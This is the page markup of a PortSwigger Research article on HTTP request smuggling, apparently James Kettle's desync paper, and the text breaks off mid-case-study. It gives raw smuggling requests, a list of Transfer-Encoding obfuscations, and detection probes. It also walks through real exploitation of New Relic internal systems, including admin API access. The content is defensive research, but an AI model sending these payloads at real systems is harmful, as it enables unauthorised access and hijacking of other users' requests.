@@ -1,0 +1,547 @@
+
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta content="IE=edge" http-equiv="X-UA-Compatible">
+        <meta content="width=device-width, initial-scale=1" name="viewport">
+        <title>HTTP Desync Attacks: Request Smuggling Reborn | PortSwigger Research</title>
+
+        <meta name="description" content="HTTP Desync Attacks: Request Smuggling Reborn">
+        
+<!-- Twitter data -->
+    <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="HTTP Desync Attacks: Request Smuggling Reborn">
+    <meta name="twitter:description" content="HTTP Desync Attacks: Request Smuggling Reborn">
+<meta name="twitter:image" content="https://portswigger.net/cms/images/bc/30/3b3a44f545e1-twittercard-request-smuggling-blog-twitter.png">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="HTTP Desync Attacks: Request Smuggling Reborn" />
+    <meta property="og:description" content="HTTP Desync Attacks: Request Smuggling Reborn">
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" />
+<meta property="og:image" content="https://portswigger.net/cms/images/bc/30/3b3a44f545e1-twittercard-request-smuggling-blog-twitter.png" />
+    <meta property="og:site_name" content="PortSwigger Research" />
+    <meta property="article:published_time" content="2019-08-07T21:00:00" />
+
+        <link rel="canonical" href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn"/>
+        <link href="/content/images/logos/favicon.ico" rel="icon" type="image/x-icon"/>
+        <link href="/content/images/logos/apple-touch-icon.png" rel="apple-touch-icon">
+        <link href="/content/psresearch.css" rel="stylesheet" type="text/css">
+        <link rel="preload" href="/Content/Fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="/Content/Fonts/ps-main/ps-icons.woff?l1la2n" as="font" crossorigin="anonymous">
+    </head>
+    <body class="theme-research">
+        
+        <header class="page-header" id="top">
+            
+<div class="container">
+    <a class="logo" href="/"></a>
+    <div class="header-right">
+        <div class="login-buttons">
+                <a class="button-orange-small" href="/users">Login</a>
+        </div>
+
+
+    <input type="checkbox" id="hamburger-mobile" class="hamburger-input-mobile">
+    <input type="radio" id="hamburger-desktop" class="hamburger-input-desktop" name="mega-nav-input">
+    <div class="hamburger-menu-mobile">
+        <label class="hamburger-menu-label header-hidden" for="hamburger-mobile">
+            <span class="hamburger-layers"></span>
+        </label>
+    </div>
+    <div class="mega-nav">
+        <input type="radio" id="mega-nav-close" class="mega-nav-input-close" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-1" class="mega-nav-input-1" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-2" class="mega-nav-input-2" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-6" class="mega-nav-input-6" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-7" class="mega-nav-input-7" name="mega-nav-input">
+
+        <label for="mega-nav-close" class="mega-nav-close"></label>
+
+        <label class="mega-nav-label mega-nav-label-1" for="mega-nav-label-1">
+            <span class="mega-nav-text">Products</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <label class="mega-nav-label mega-nav-label-2" for="mega-nav-label-2">
+            <span class="mega-nav-text">Solutions</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <a class="mega-nav-link" href="/research"><span class="mega-nav-text">Research</span></a>
+        <a class="mega-nav-link" href="/web-security"><span class="mega-nav-text">Academy</span></a>
+        <a class="mega-nav-link" href="/daily-swig"><span class="mega-nav-text">Daily Swig</span></a>
+        <label class="mega-nav-label mega-nav-label-6" for="mega-nav-label-6">
+            <span class="mega-nav-text">Support</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+
+        <label class="mega-nav-label mega-nav-label-7 header-hidden" for="mega-nav-label-7">
+            <span class="mega-nav-text">Company</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <div class="hamburger-menu-desktop">
+            <label class="hamburger-menu-label header-show" for="hamburger-desktop">
+                <span class="hamburger-layers"></span>
+            </label>
+            <div>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-1" href="/customers"><span class="mega-nav-text">Customers</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-2" href="/about"><span class="mega-nav-text">About</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-3" href="/blog"><span class="mega-nav-text">Blog</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-4" href="/careers"><span class="mega-nav-text">Careers</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-5" href="/legal"><span class="mega-nav-text">Legal</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-6" href="/contact"><span class="mega-nav-text">Contact</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-7" href="/support/reseller-faqs"><span class="mega-nav-text">Resellers</span></a>
+            </div>
+        </div>
+
+        <a class="mega-nav-link header-hidden" href="/users/youraccount"><span class="mega-nav-text">My account</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-1" href="/customers"><span class="mega-nav-text">Customers</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-2" href="/about"><span class="mega-nav-text">About</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-3" href="/blog"><span class="mega-nav-text">Blog</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-4" href="/careers"><span class="mega-nav-text">Careers</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-5" href="/legal"><span class="mega-nav-text">Legal</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-6" href="/contact"><span class="mega-nav-text">Contact</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-7" href="/support/reseller-faqs"><span class="mega-nav-text">Resellers</span></a>
+
+        <div class="mega-nav-container">
+
+            <div class="mega-nav-content mega-nav-content-1">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <a href="/burp/enterprise" class="link-block-white">
+                                <img src="/content/images/svg/icons/enterprise.svg" alt="Burp Suite Enterprise Edition">
+                                <span><strong>Burp Suite Enterprise Edition</strong></span>
+                                <span>The enterprise-enabled web vulnerability scanner.</span>
+                            </a>
+
+                            <a href="/burp/pro" class="link-block-white">
+                                <img src="/content/images/svg/icons/professional.svg" alt="Burp Suite Professional">
+                                <span><strong>Burp Suite Professional</strong></span>
+                                <span>The world's #1 web penetration testing toolkit.</span>
+                            </a>
+
+                            <a href="/burp/communitydownload" class="link-block-white">
+                                <img src="/content/images/svg/icons/community.svg" alt="Burp Suite Community Edition">
+                                <span><strong>Burp Suite Community Edition</strong></span>
+                                <span>The best manual tools to start web security testing.</span>
+                            </a>
+
+                            <a href="/burp" class="chevron-after">View all product editions</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="/burp/vulnerability-scanner">
+                                    <p><strong>Burp Scanner</strong></p>
+                                    <p>Learn how Burp's innovative scanning engine finds more bugs, more quickly.</p>
+                                    <img src="/content/images/callouts/burp-scanner.jpg" alt="Burp Scanner">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="mega-nav-content mega-nav-content-2">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <div class="container-columns">
+                                <a href="/solutions" class="link-block-white">
+                                    <span><strong>Application Security Testing</strong></span>
+                                    <span>See how our software enables the world to secure the web.</span>
+                                </a>
+                                <a href="/solutions/devsecops" class="link-block-white">
+                                    <span><strong>DevSecOps</strong></span>
+                                    <span>Catch critical bugs; ship more secure software, more quickly.</span>
+                                </a>
+
+                                <a href="/solutions/penetration-testing" class="link-block-white">
+                                    <span><strong>Penetration Testing</strong></span>
+                                    <span>Accelerate penetration testing - find more bugs, more quickly.</span>
+                                </a>
+                                <a href="/solutions/automated-security-testing" class="link-block-white">
+                                    <span><strong>Automated Scanning</strong></span>
+                                    <span>Scale dynamic scanning. Reduce risk. Save time/money.</span>
+                                </a>
+
+                                <a href="/solutions/bug-bounty-hunting" class="link-block-white">
+                                    <span><strong>Bug Bounty Hunting</strong></span>
+                                    <span>Level up your hacking and earn more bug bounties.</span>
+                                </a>
+                                <a href="/solutions/compliance" class="link-block-white">
+                                    <span><strong>Compliance</strong></span>
+                                    <span>Enhance security monitoring to comply with confidence.</span>
+                                </a>
+                            </div>
+                            <a href="/solutions" class="chevron-after">View all solutions</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="/burp/enterprise">
+                                    <p><strong>Burp Suite Enterprise Edition</strong></p>
+                                    <p>Scan it all. Unleash AppSec. Supercharge engineering. Power DevSecOps.</p>
+                                    <img src="/content/images/callouts/enterprise.jpg" alt="Burp Suite Enterprise Edition">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="mega-nav-content mega-nav-content-6">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <div class="container-columns">
+                                <a href="/support" class="link-block-white">
+                                    <span><strong>Support Center</strong></span>
+                                    <span>Get help and advice from our experts on all things Burp.</span>
+                                </a>
+                                <a href="/burp/documentation" class="link-block-white">
+                                    <span><strong>Documentation</strong></span>
+                                    <span>Browse full documentation for all Burp Suite products.</span>
+                                </a>
+                                <a href="/burp/documentation/desktop/getting-started" class="link-block-white">
+                                    <span><strong>Get Started - Professional</strong></span>
+                                    <span>Get started with Burp Suite Professional.</span>
+                                </a>
+                                <a href="/burp/documentation/enterprise/" class="link-block-white">
+                                    <span><strong>Get Started - Enterprise</strong></span>
+                                    <span>Get started with Burp Suite Enterprise Edition.</span>
+                                </a>
+
+                                <a href="/burp/releases" class="link-block-white">
+                                    <span><strong>Releases</strong></span>
+                                    <span>See the latest Burp Suite features and innovations.</span>
+                                </a>
+                                <a href="https://forum.portswigger.net/" class="link-block-white">
+                                    <span><strong>User Forum</strong></span>
+                                    <span>Get your questions answered in the User Forum.</span>
+                                </a>
+                            </div>
+                            <a href="/support" class="chevron-after">Visit the Support Center</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="/burp/enterprise">
+                                    <p><strong>Burp Suite Enterprise Edition</strong></p>
+                                    <p>Scan it all. Unleash AppSec. Supercharge engineering. Power DevSecOps.</p>
+                                    <img src="/content/images/callouts/enterprise.jpg" alt="Burp Suite Enterprise Edition">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+    </div>
+</div>
+        </header>
+        <nav class="navigation-top">
+            <input id="nav-main-featured-research" type="checkbox">
+            <label for="nav-main-featured-research">
+                <span>Articles</span>
+                <span class="icon-arrow-head-down"></span>
+            </label>
+            <ul>
+                
+                <li >
+                    <a href="/research">Overview</a>
+                </li>
+                <li >
+                    <input type="checkbox" id="nav-featured-research">
+<label for="nav-featured-research">
+    <span>Core Topics</span>
+    <span class="icon-arrow-head-down"></span>
+</label>
+    <div>
+            <a href="/research/cross-site-scripting-research">XSS</a>
+            <a href="/research/request-smuggling">Request Smuggling</a>
+            <a href="/research/template-injection">Template Injection</a>
+            <a href="/research/top-10-web-hacking-techniques">Top 10 Hacking Techniques</a>
+    </div>
+
+                </li>
+                <li class = current>
+                    <a href="/research/articles">Articles</a>
+                </li>
+                <li >
+                    <input type="checkbox" id="nav-meet-the-researchers">
+<label for="nav-meet-the-researchers">
+    <span>Meet the Researchers</span>
+    <span class="icon-arrow-head-down"></span>
+</label>
+<div>
+    <a href="/research/james-kettle">James Kettle</a>
+    <a href="/research/gareth-heyes">Gareth Heyes</a>
+    <a href="/research/michael-stepankin">Michael Stepankin</a>
+</div>
+                </li>
+                <li >
+                    <a href="/research/talks">Talks</a>
+                </li>
+            </ul>
+        </nav>
+        <div class="wrapper">
+            
+
+<input id="MediaId" name="MediaId" type="hidden" value="0284156671ACA1F4A6EE4DFC2F64A632" />
+
+
+
+<div class="section-dark-blue-dotted-full-width-medium-content-width">
+    <h1>HTTP Desync Attacks: Request Smuggling Reborn</h1>
+    <div class="container-relative-medium-content-width">
+        
+
+<div class="share-right">
+    <input id="share-button-right" type="checkbox">
+    <ul class="share-right-ul">
+        <li>
+            <a href="https://twitter.com/share?url=https%3a%2f%2fportswigger.net%2fresearch%2fhttp-desync-attacks-request-smuggling-reborn&text=HTTP+Desync+Attacks%3a+Request+Smuggling+Reborn%20-%20%40PortSwiggerRes%0A" target="_blank" init-ga-click data-ga-click-label="twitter">
+                <span class="icon-twitter"></span>
+            </a>
+        </li>
+        <li>
+            <a href="https://api.whatsapp.com/send?text=https%3a%2f%2fportswigger.net%2fresearch%2fhttp-desync-attacks-request-smuggling-reborn" target="_blank" init-ga-click data-ga-click-label="whatsapp">
+                <span class="icon-whatsapp"></span>
+            </a>
+        </li>
+        <li>
+            <a href="https://reddit.com/submit?url=https%3a%2f%2fportswigger.net%2fresearch%2fhttp-desync-attacks-request-smuggling-reborn" target="_blank" init-ga-click data-ga-click-label="reddit">
+                <span class="icon-reddit-dark"></span>
+            </a>
+        </li>
+        <li>
+            <a href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fportswigger.net%2fresearch%2fhttp-desync-attacks-request-smuggling-reborn" target="_blank" init-ga-click data-ga-click-label="linkedin">
+                <span class="icon-linkedin"></span>
+            </a>
+        </li>
+        <li>
+            <a href="mailto:?subject=HTTP+Desync+Attacks%3a+Request+Smuggling+Reborn&body=HTTP+Desync+Attacks%3a+Request+Smuggling+Reborn%0A%0AHTTP+Desync+Attacks%3a+Request+Smuggling+Reborn%0A%0Ahttps://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" init-ga-click data-ga-click-label="email">
+                <span class="icon-email"></span>
+            </a>
+        </li>
+        <li>
+            <a href="/research/rss">
+                <span class="icon-rss"></span>
+            </a>
+        </li>
+    </ul>
+
+    <label class="share-button" for="share-button-right">
+        <span class="icon-share"></span>
+    </label>
+</div>
+    </div>
+    <div class="callout-individual-profile">
+    <img alt="James Kettle" src="/content/images/profiles/callout_james_kettle_112px.png">
+    <div>
+            <h3><a href="/research/james-kettle">James Kettle</a></h3>
+        <p>Director of Research</p>
+        <p>
+            <span class="icon-twitter"></span>
+<a href="https://twitter.com/albinowax">@albinowax</a>
+        </p>
+    </div>
+</div>
+    <ul class="publication-list">
+        <li>
+            <p><span class="icon-calendar"></span><strong>Published: </strong>07 August 2019 at 21:00 UTC</p>
+        </li>
+        <li>
+            <p><strong>Updated: </strong>18 November 2020 at 12:40 UTC</p>
+        </li>
+        <li>
+        </li>
+    </ul>
+    <p><img src="/cms/images/f4/b3/753498a08488-article-request-smuggling-article.png"></p><h2 id="abstract">Abstract</h2><p>HTTP requests are traditionally viewed as isolated, standalone entities. In this paper, I'll explore forgotten techniques for remote, unauthenticated attackers to smash through this isolation and splice their requests into others, through which I was able to play puppeteer with the web infrastructure of numerous commercial and military systems, rain exploits on their visitors, and harvest over $70k in bug bounties.</p><p>Using these targets as case studies, I'll show you how to delicately amend victims' requests to route them into malicious territory, invoke harmful responses, and lure credentials into your open arms. I'll also demonstrate using back-end reassembly on your own requests to exploit every modicum of trust placed on the front-end, gain maximum privilege access to internal APIs, poison web caches, and compromise PayPal's login page.</p><p><a href="/web-security/request-smuggling">HTTP Request Smuggling</a> was first documented back in 2005 by <a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">Watchfire</a>, but a fearsome reputation for difficulty and collateral damage left it mostly ignored for years while the web's susceptibility grew. Alongside new attack variants and exploitation vectors, I'll help you tackle this legacy with custom open source tooling and a refined methodology for reliable black-box detection, assessment and exploitation with minimal risk of collateral damage.</p><p>This paper accompanies the <a href="https://www.youtube.com/watch?v=w-eJM2Pc0KI" target="_blank">HTTP Desync Attacks presentation</a> at Black Hat and DEF CON:</p><p class="youtube-wrapper"><iframe src="https://www.youtube.com/embed/w-eJM2Pc0KI?origin=https://portswigger.net"></iframe></p><br><p>It's also available as a&nbsp;<a href="/kb/papers/z7ow0oy8/http-desync-attacks.pdf" target="_blank">printable whitepaper</a>&nbsp;and <a href="https://portswigger.net/kb/papers/z7ow0oy8/http-desync-attacks-slides.pdf" target="_blank">slide deck</a>, and we've released <a href="/web-security/request-smuggling" target="_blank">online labs</a> to accompany it.&nbsp;</p><h2 id="core">Core concepts</h2><p>Since HTTP/1.1 there's been widespread support for sending multiple HTTP requests over a single underlying TCP or SSL/TLS socket. The protocol is extremely simple - HTTP requests are simply placed back to back, and the server parses headers to work out where each one ends and the next one starts. This is often confused with <a href="https://portswigger.net/blog/turbo-intruder-embracing-the-billion-request-attack">HTTP pipelining</a>, which is a rarer subtype that's not required for the attacks described in this paper.</p><p>By itself, this is harmless. However, modern websites are composed of chains of systems, all talking over HTTP. This multi-tiered architecture takes HTTP requests from multiple different users and routes them over a single TCP/TLS connection:</p><img src="/cms/images/3b/af/c28234336ee3-article-revproxy.svg" alt="Reverse proxy working as intended"><p>This means that suddenly, it's crucial that the back-end agrees with the front-end about where each message ends. Otherwise, an attacker might be able to send an ambiguous message which gets interpreted as two distinct HTTP requests by the back-end:</p><img src="/cms/images/17/3d/95dfcd7b151f-article-revproxy-desynced.svg" alt="Desynchronized reverse proxy"><p>This gives the attacker the ability to prepend arbitrary content at the start of the next legitimate user's request. Throughout this paper, the smuggled content will be referred to as the 'prefix', and highlighted in orange.</p><p>Let's imagine that the front-end prioritises the first content-length header, and the back-end prioritises the second. From the back-end's perspective, the TCP stream might look something like:</p><code><span class="blue">POST / HTTP/1.1<br>Host: example.com<br>Content-Length: 6<br>Content-Length: 5<br><br>12345</span><span class="orange">G</span><span class="green">POST / HTTP/1.1<br>Host: example.com<br>…<br></span></code><p>Under the hood, the front-end forwards the blue and orange data on to the back-end, which only reads the blue content before issuing a response. This leaves the back-end socket poisoned with the orange data. When the legitimate green request arrives, it ends up appended onto the orange content, causing an unexpected response.</p><p>In this example, the injected 'G' will corrupt the green user's request and they will probably get a response along the lines of "Unknown method GPOST". </p><p>Every attack in this paper follows this basic format. The Watchfire paper describes an alternative approach dubbed 'backward request smuggling' but this relies on pipelining between the front and back-end systems, so it's rarely an option.</p><p>In real life, the dual content-length technique rarely works because many systems sensibly reject requests with multiple content-length headers. Instead, we're going to attack systems using chunked encoding - and this time we've got the specification <a href="https://tools.ietf.org/html/rfc2616#section-4.4">RFC 2616 on our side</a>: </p><blockquote>If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.</blockquote><p>Since the specification implicitly allows processing requests using both <span class="code">Transfer-Encoding: chunked</span> and <span class="code">Content-Length</span>, few servers reject such requests. Whenever we find a way to hide the Transfer-Encoding header from one server in a chain it will fall back to using the Content-Length and we can desynchronize the whole system. </p><p>You might not be very familiar with chunked encoding since tools like Burp Suite automatically buffer chunked requests/responses into regular messages for ease of editing. In a chunked message, the body consists of 0 or more chunks. Each chunk consists of the chunk size, followed by a newline (\r\n), followed by the chunk contents. The message is terminated with a chunk of size 0. Here's simple desynchronization attack using chunked encoding:</p><code><span class="blue">POST / HTTP/1.1<br>Host: example.com<br>Content-Length: 6<br>Transfer-Encoding: chunked<br><br>0</span><br><br><span class="orange">G</span><span class="green">POST / HTTP/1.1<br>Host: example.com</span><br></code><p>We haven't made any effort to hide the Transfer-Encoding header here, so this exploit will primarily work on systems where the front-end simply doesn't support chunked encoding - a behaviour seen on many websites using the content delivery network Akamai. <b>Update:</b> Akamai deployed a fix roughly 48 hours after this post was published, although no public advisory has been issued.</p><p>If it's the back-end that doesn't support chunked encoding, we'll need to flip the offsets around:</p><code><span class="blue">POST / HTTP/1.1<br>Host: example.com<br>Content-Length: 3<br>Transfer-Encoding: chunked<br><br>6</span><br><span class="orange">PREFIX<br>0</span><br><br><span class="green">POST / HTTP/1.1<br>Host: example.com<br></span></code><p>This technique works on quite a few systems, but we can exploit many more by making the Transfer-Encoding header slightly harder to spot, so that one system doesn't see it. This can be achieved using discrepancies in servers' HTTP parsing. Here's a few examples of requests where only some servers recognise the <span class="code">Transfer-Encoding: chunked</span> header. Each of these has been successfully used to exploit at least one system during this research:</p><code>Transfer-Encoding: xchunked</code><code>Transfer-Encoding : chunked</code><code>Transfer-Encoding: chunked<br>Transfer-Encoding: x</code><code>Transfer-Encoding:[tab]chunked</code><code>GET / HTTP/1.1<br>&nbsp;Transfer-Encoding: chunked</code><code>X: X[\n]Transfer-Encoding: chunked</code><code>Transfer-Encoding<br>&nbsp;: chunked</code><p>Each of these quirks is harmless if both the front-end and back-end server have it, and a major threat otherwise. For yet more techniques, check out <a href="https://regilero.github.io/tag/Smuggling/">regilero's ongoing research</a>. We'll look at practical examples using other techniques shortly.</p><h2 id="methodology">Methodology</h2><p>The theory behind request smuggling is straightforward, but the number of uncontrolled variables and our total lack of visibility into what's happening behind the front-end can cause complications.</p><p>I've developed techniques and tools to tackle these challenges, and composed them into the following simple methodology with which we can hunt down request smuggling vulnerabilities and prove their impact:</p><img src="/cms/images/f5/ef/c5b589c7a67f-article-methodology-01.svg" alt="Detect-Confirm-Explore-Store/Attack"><h2 id="detect">Detect</h2><p>The obvious approach to detecting request smuggling vulnerabilities is to issue an ambiguous request followed by a normal 'victim' request, then observe whether the latter gets an unexpected response. However, this is extremely prone to interference; if another user's request hits the poisoned socket before our victim request, they'll get the corrupted response and we won't spot the vulnerability. This means that on a live site with a high volume of traffic it can be hard to prove request smuggling exists without exploiting numerous genuine users in the process. Even on a site with no other traffic, you'll risk false negatives caused by application-level quirks terminating connections.</p><p>To address this, I've developed a detection strategy that uses a sequence of messages which make vulnerable back-end systems hang and time out the connection. This technique has few false positives, resists application-level quirks that would otherwise cause false negatives, and most importantly has virtually no risk of affecting other users.</p><p>Let's assume the front-end server uses the Content-Length header, and the back-end uses the Transfer-Encoding header. I'll refer to this orientation as CL.TE for short. We can detect potential request smuggling by sending the following request:</p><code><span class="blue">POST /about HTTP/1.1<br>Host: example.com<br>Transfer-Encoding: chunked<br>Content-Length: 4<br><br>1<br>Z</span><br><span class="orange">Q</span></code><p>Thanks to the short Content-Length, the front end will forward the blue text only, and the back end will time out while waiting for the next chunk size. This will cause an observable time delay.</p><p>If both servers are in sync (TE.TE or CL.CL), the request will either be rejected by the front-end or harmlessly processed by both systems. Finally, if the desync occurs the other way around (TE.CL) the front-end will reject the message without ever forwarding it to the back-end, thanks to the invalid chunk size 'Q'. This prevents the back-end socket from being poisoned.</p><p>We can safely detect TE.CL desync using the following request:</p><code><span class="blue">POST /about HTTP/1.1<br>Host: example.com<br>Transfer-Encoding: chunked<br>Content-Length: 6<br><br>0<br><br></span><span class="orange">X</span></code><p>Thanks to the terminating '0' chunk the front-end will only forward the blue text, and the back-end will time out waiting for the X to arrive.</p><p>If the desync happens the other way around (CL.TE) then this approach will poison the back-end socket with an X, potentially harming legitimate users. Fortunately, by always running the prior detection method first, we can rule out that possibility.</p><p>These requests can be adapted to target arbitrary discrepancies in header parsing, and they're used to automatically identify request smuggling vulnerabilities by <a href="https://github.com/portswigger/http-request-smuggler">HTTP Request Smuggler</a> - an open source Burp Suite extension developed to help with such attacks. They're also now used in Burp Suite's core scanner. Although this is a server-level vulnerability, different endpoints on a single domain are often routed to different destinations, so this technique should be applied to every endpoint individually.</p><h2 id="confirm">Confirm</h2><p>At this point, you've gone as far as you can without risking side effects for other users. However, many clients will be reluctant to treat a report seriously without further evidence, so that's what we're going to get. The next step towards demonstrating the full potential of request smuggling is to prove back-end socket poisoning is possible. To do this we'll issue a request designed to poison a back-end socket, followed by a request which will hopefully fall victim to the poison, visibly altering the response. </p><p>If the first request causes an error the back-end server may decide to close the connection, discarding the poisoned buffer and breaking the attack. Try to avoid this by targeting an endpoint that is designed to accept a POST request, and preserving any expected GET/POST parameters.</p><p>Some sites have multiple distinct back-end systems, with the front-end looking at each request's method, URL, and headers to decide where to route it. If the victim request gets routed to a different back-end from the attack request, the attack will fail. As such, the 'attack' and 'victim' requests should initially be as similar as possible.</p><p>If the target request looks like:</p><code><span class="blue">POST /search HTTP/1.1<br>Host: example.com<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 11<br><br>q=smuggling</span></code><p>Then an attempt at CL.TE socket poisoning would look like:</p><code><span class="blue">POST /search HTTP/1.1<br>Host: example.com<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 53<br>Transfer-Encoding: zchunked<br><br>17<br>=x&amp;q=smuggling&amp;x=<br>0</span><br><br><span class="orange">GET /404 HTTP/1.1<br>Foo: b</span><span class="green">POST /search HTTP/1.1<br>Host: example.com<br>…</span> </code><p>If the attack is successful the victim request (in green) will get a 404 response.</p><p>The TE.CL attack looks similar, but the need for a closing chunk means we need to specify all the headers ourselves and place the victim request in the body. Ensure the Content-Length in the prefix is slightly larger than the body:</p><code><span class="blue">POST /search HTTP/1.1<br>Host: example.com<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 4<br>Transfer-Encoding: zchunked<br><br>96<br></span><span class="orange">GET /404 HTTP/1.1<br>X: x=1&amp;q=smugging&amp;x=<br>Host: example.com<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 100<br><br>x=<br>0</span><br><br><span class="green">POST /search HTTP/1.1<br>Host: example.com </span> </code><p>If the site is live, another user's request may hit the poisoned socket before yours, which will make your attack fail and potentially upset the user. As a result, this process often takes a few attempts, and on high-traffic sites may require thousands of attempts. Please exercise both caution and restraint, and target staging servers where possible. </p><h2 id="explore">Explore</h2><p>I'll demonstrate the rest of the methodology using a range of real websites. As usual, I've exclusively targeted companies that make it clear they're happy to work with security researchers by running a bug bounty program. You can find more information on the pipeline I used to find these case studies in <a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface" target="_blank">Cracking the Lens</a>. Thanks to the proliferation of private programs and lethargic patch times, I've sadly had to redact quite a few. Where websites are explicitly named, please bear in mind that they're one of the few that are now secure against this attack.</p><p>Now we've established that socket poisoning is possible, the next step is to gather information so we can launch a well-informed attack.</p><p>Front-ends often append and rewrite HTTP request headers like <span class="code">X-Forwarded-Host</span> and <span class="code">X-Forwarded-For</span> alongside numerous custom ones that often have difficult-to-guess names. Our smuggled requests may be missing these headers, which can lead to unexpected application behaviour and failed attacks. </p><p>Fortunately, there's a simple strategy with which we can partially lift the curtain and gain visibility into these hidden headers. This lets us restore functionality by manually adding the headers ourselves, and may even enable further attacks.</p><p>Simply find a page on the target application which reflects a POST parameter, shuffle the parameters so the reflected one is last, increase the Content-Length a little, and then smuggle the resulting request:</p><code><span class="blue">POST / HTTP/1.1<br>Host: login.newrelic.com<br>Content-Length: 142<br>Transfer-Encoding: chunked<br>Transfer-Encoding: x<br><br>0<br><br></span><span class="orange">POST /login HTTP/1.1<br>Host: login.newrelic.com<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 100<br>…<br>login[email]=asdf</span><span class="green">POST /login HTTP/1.1<br>Host: login.newrelic.com</span></code><p> The green request will be rewritten by the front-end before it lands in the login[email] parameter, so when it gets reflected back it'll leak all the internal headers:</p><code> Please ensure that your email and password are correct.<br><br>&lt;input id="email" value="asdfPOST /login HTTP/1.1<br>Host: login.newrelic.com<br>X-Forwarded-For: 81.139.39.150<br>X-Forwarded-Proto: https<br>X-TLS-Bits: 128<br>X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256<br>X-TLS-Version: TLSv1.2<br>x-nr-external-service: external </code><p>By incrementing the Content-Length header you can gradually retrieve more information, until you try to read beyond the end of the victim request and it times out.</p><p>Some systems are completely reliant on the front-end system for security, and as soon as you're past that you can waltz straight in. On login.newrelic.com, the 'back-end' system was a proxy iself, so changing the smuggled Host header granted me access to different New Relic systems. Initially, every internal system I hit thought my request was sent over HTTP and responded with a redirect:</p><code><span class="blue">...</span><br><span class="orange">GET / HTTP/1.1<br>Host: staging-alerts.newrelic.com<br></span><br>HTTP/1.1 301 Moved Permanently<br>Location: https://staging-alerts.newrelic.com/</code><p>This was easily fixed using the X-Forwarded-Proto header observed earlier:</p><code><span class="blue">...</span><br><span class="orange">GET / HTTP/1.1<br>Host: staging-alerts.newrelic.com<br>X-Forwarded-Proto: https<br><br></span>HTTP/1.1 404 Not Found<br><br>Action Controller: Exception caught </code><p>With a little content discovery I found a useful endpoint on the target:</p><code><span class="blue">...</span><br><span class="orange">GET /revision_check HTTP/1.1<br>Host: staging-alerts.newrelic.com<br>X-Forwarded-Proto: https<br><br></span>HTTP/1.1 200 OK<br><br>Not authorized with header:</code><p>The error message clearly told me I needed an authorization header of some sort, but teasingly failed to name it. I decided to try the 'X-nr-external-service' header seen earlier:</p><code><span class="blue">...</span><br><span class="orange">GET /revision_check HTTP/1.1<br>Host: staging-alerts.newrelic.com<br>X-Forwarded-Proto: https<br>X-nr-external-service: 1<br><br></span>HTTP/1.1 403 Forbidden<br><br>Forbidden</code><p>Unfortunately this didn't work - it caused the same Forbidden response that we'd already seen when trying access that URL directly. This suggested that the front-end was using the X-nr-external-service header to indicate that the request originated from the internet, and by smuggling and therefore losing the header, we'd accidentally tricked their system into thinking our request originated internally. This was very educational, but not directly useful - we still needed the name of the missing authorization header.</p><p>At this point I could have applied the processed-request-reflection technique to a range of endpoints until I found one that had the right request header. Instead, I decided to cheat and consult my notes from <a href="https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface">last time I compromised New Relic</a>. This revealed two invaluable headers - Server-Gateway-Account-Id and Service-Gateway-Is-Newrelic-Admin. Using these, I was able to gain full admin-level access to their internal API:</p><code><span class="blue">POST /login HTTP/1.1<br>Host: login.newrelic.com<br>Content-Length: 564<br>Transfer-Encoding: chunked<br>Transfer-encoding: cow<br><br>0</span><br><br><span class="orange">POST /internal_api/934454/session 